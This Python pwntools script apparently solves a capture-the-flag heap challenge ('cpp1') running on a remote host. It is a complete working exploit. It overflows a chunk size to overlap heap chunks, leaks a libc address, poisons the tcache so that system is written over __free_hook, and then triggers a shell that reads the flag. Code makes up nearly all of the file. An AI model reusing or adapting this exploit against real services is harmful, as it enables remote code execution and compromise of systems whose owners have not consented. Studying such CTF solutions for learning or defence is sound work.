# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './cpp1'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.104.143.202'
    port = '43359'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add( idx , size ):
    cmd(1)
    sla('I:>>' , idx)
    sla('S:>>' , size)

def edit( idx , content ):
    cmd(2)
    sla('I:>>' , idx)
    sla('V:>>' , content)

def show( idx  ):
    cmd(3)
    sla('I:>>' , idx)

def delete( idx  ):
    cmd(4)
    sla('I:>>' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add( 0 , 0x28)
    add( 1 , 0xf8)
    add( 2 , 0xf8)
    add( 3 , 0xf8)
    add( 4 , 0xf8)
    add( 5 , 0xf8)
    add( 6 , 0x18)

    edit(0 , 'a'*0x28 + p64(0x501))
    delete(1)
    add(7 , 0xf8)
    show(2)
    
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    lg('__free_hook' , __free_hook)
    add( 8 , 0xf8)

    delete(7)
    delete(8)
    edit(2 , p64(__free_hook - 0x10))
    add( 9 , 0xf8)
    add( 10 , 0xf8)
    edit( 10 , flat( '/bin/sh\x00' , 0 , system_addr ))

    delete(10)

    # dbg()

    p.success(getShell())
    p.interactive()

attack()


'''
@File    :   cpp1.py
@Time    :   2021/10/31 12:36:00
@Author  :   Niyah 
'''